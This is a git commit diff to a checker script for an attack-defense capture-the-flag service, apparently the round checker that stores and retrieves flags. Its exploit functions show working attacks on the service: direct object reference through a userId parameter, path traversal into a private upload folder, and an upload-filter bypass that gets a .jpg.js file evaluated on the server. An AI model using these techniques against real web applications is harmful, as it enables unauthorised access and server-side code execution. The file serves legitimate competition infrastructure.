f2cb37615b7a933bac7f75f191a2c4b1a07870f7
Jannik <jannik44@hotmail.de>
2023-05-22 14:19:26 +0200

    added address:port to client requests

--- checker/src/checker.py
+++ checker/src/checker.py
@@ -29,23 +29,23 @@ def parseCookie(cookieString):
     return cookieString[start:end]
 
 
-async def register(client: AsyncClient):
+async def register(task, client: AsyncClient):
     name, password = ''.join(random.choices(string.ascii_letters + string.digits, k=10)), ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     email = ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '@' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=3))
-    registerResp = await client.post("/user/register", json={"name": name, "email": email, "password": password})
+    registerResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/user/register", json={"name": name, "email": email, "password": password})
     assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
     cookie = parseCookie(str(client.cookies))
 
     return email, password, cookie
 
 
-async def login(email: str, password: str, client: AsyncClient):
-    loginResp = await client.post("/user/login", json={"email": email, "password": password})
+async def login(task, email: str, password: str, client: AsyncClient):
+    loginResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/user/login", json={"email": email, "password": password})
     assert_equals(loginResp.status_code, 302, "couldn't login with userdata")
     cookie = parseCookie(str(client.cookies))
     
     # scour the frontpage to retrieve our unique userId
-    profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
+    profileResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/", cookies={"jwtToken": cookie}) 
     html = BeautifulSoup(profileResp, "html.parser")
     userClass = html.find('span', attrs={'class':'user'})
     profileLink = userClass.find('a')
@@ -62,7 +62,7 @@ async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
     await db.set("userinfo", (email, password) )
     
     # deposit the flag as the users personal note
-    uploadResp = await client.post("/user/editnote", json={"text": task.flag}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/user/editnote", json={"text": task.flag}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couldn't store flag under /user/editnote")
 
 
@@ -77,7 +77,7 @@ async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     with open('flag.txt', 'w') as flagFile:
         flagFile.write(task.flag)
 
-    uploadResp = await client.post('/files/private', files={"privateFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/files/private", files={"privateFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/private")
 
 
@@ -92,7 +92,7 @@ async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, d
     with open('flag.txt', 'w') as flagFile:
         flagFile.write(task.flag)
 
-    uploadResp = await client.post('/files/backup', files={"backupFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/files/backup", files={"backupFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")
 
 
@@ -109,8 +109,8 @@ async def getflag_note(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
     userId, cookie = await login(email, password, client)
 
     # now that we have the userId we visit our profile page and find the flag
-    flagResp = await client.get(f"/user/profile/{userId}", cookies={"jwtToken": cookie})
-    assert_equals(flagResp.status_code, 200, "couldn't get profile page containing the flag")
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/user/profile/{userId}", cookies={"jwtToken": cookie})
+    assert_equals(flagResp.status_code, 200, "couldn't get profile page")
     assert_in(task.flag, flagResp.text, "flag not found on profile page")
 
 
@@ -127,8 +127,8 @@ async def getflag_private(task: GetflagCheckerTaskMessage, client: AsyncClient, 
     userId, cookie = await login(email, password, client)
     
     # visit the users private upload directory to find the flag 
-    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/flag.txt", cookies={"jwtToken": cookie})
-    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from private directory")
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/uploads/{base64.b64encode(userId.encode()).decode()}/private/flag.txt", cookies={"jwtToken": cookie})
+    assert_equals(flagResp.status_code, 200, "couldn't get private directory")
     assert_in(task.flag, flagResp.text, "flag not found in private directory")
 
 
@@ -145,8 +145,8 @@ async def getflag_backup(task: GetflagCheckerTaskMessage, client: AsyncClient, d
     userId, cookie = await login(email, password, client)
     
     # visit the users backup directory to retrieve the flag
-    flagResp = await client.get(f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/flag.txt", cookies={"jwtToken": cookie})
-    assert_equals(flagResp.status_code, 200, "couldn't retrieve the flag from backup directory")
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/files/retrieve/{base64.b64encode(userId.encode()).decode()}/flag.txt", cookies={"jwtToken": cookie})
+    assert_equals(flagResp.status_code, 200, "couldn't get backup directory")
     assert_in(task.flag, flagResp.text, "flag not found in backup directory")
 
 
@@ -162,8 +162,8 @@ async def exploit_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, 
     email, password, cookie = await register(client)
 
     # exploit
-    flagResp = await client.get(f"/user/profile/{userId}?userId={userId}", cookies={"jwtToken": cookie})
-    assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/user/profile/{userId}?userId={userId}", cookies={"jwtToken": cookie})
+    assert_equals(flagResp.status_code, 200, "couldn't get profile page")
 
     # retrieve and return the flag
     if flag := searcher.search_flag(flagResp.text):
@@ -182,8 +182,8 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
     email, password, cookie = await register(client)
 
     # exploit
-    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/../private/flag.txt", cookies={"jwtToken": cookie})
-    assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/uploads/{base64.b64encode(userId.encode()).decode()}/public/../private/flag.txt", cookies={"jwtToken": cookie})
+    assert_equals(flagResp.status_code, 200, "couldn't get private directory")
 
     # retrieve and return the flag
     if flag := searcher.search_flag(flagResp.text):
@@ -203,7 +203,7 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
 
     # scour the frontpage to retrieve our unique userId
     try:
-        profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
+        profileResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/", cookies={"jwtToken": cookie}) 
         html = BeautifulSoup(profileResp, "html.parser")
         userClass = html.find('span', attrs={'class':'user'})
         profileLink = userClass.find('a')
@@ -228,11 +228,11 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
                             result;""" )
     
     # upload the file to our public upload directory, bypassing server side filters
-    uploadResp = await client.post('/files/upload', headers={'Content-Type': 'image/jpeg'}, data={"file": open('getflag.jpg.js', 'rb')}, cookies={"jwtToken": cookie})
+    uploadResp = await client.post(f"http://{task.address}:{SERVICE_PORT}/files/upload", headers={'Content-Type': 'image/jpeg'}, data={"file": open('getflag.jpg.js', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 200, "couldn't upload exploit to /files/upload")
 
     # the file gets evaluated on server side and we should get the flag in the response
-    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"http://{task.address}:{SERVICE_PORT}/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, f"couldn't retrieve flag via /uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js")
 
     # retrieve and return the flag
